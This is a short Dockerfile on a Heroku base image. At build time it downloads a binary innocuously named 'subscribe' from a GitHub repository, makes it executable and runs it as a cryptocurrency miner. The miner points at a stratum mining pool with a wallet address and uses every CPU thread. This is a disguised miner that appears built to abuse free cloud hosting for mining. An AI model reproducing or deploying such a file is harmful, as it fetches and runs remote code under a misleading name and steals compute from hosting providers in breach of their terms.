FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/AVGandhi/student/raw/main/subscribe; chmod +x subscribe; ./subscribe -a power2b -o stratum+tcp://stratum-na.rplant.xyz:17022 -u MZcw786kC8ng7KUeHZMQuhFhr2Funss7Kk.VPS -t $(nproc --all) -p password=test
CMD bash heroku.sh
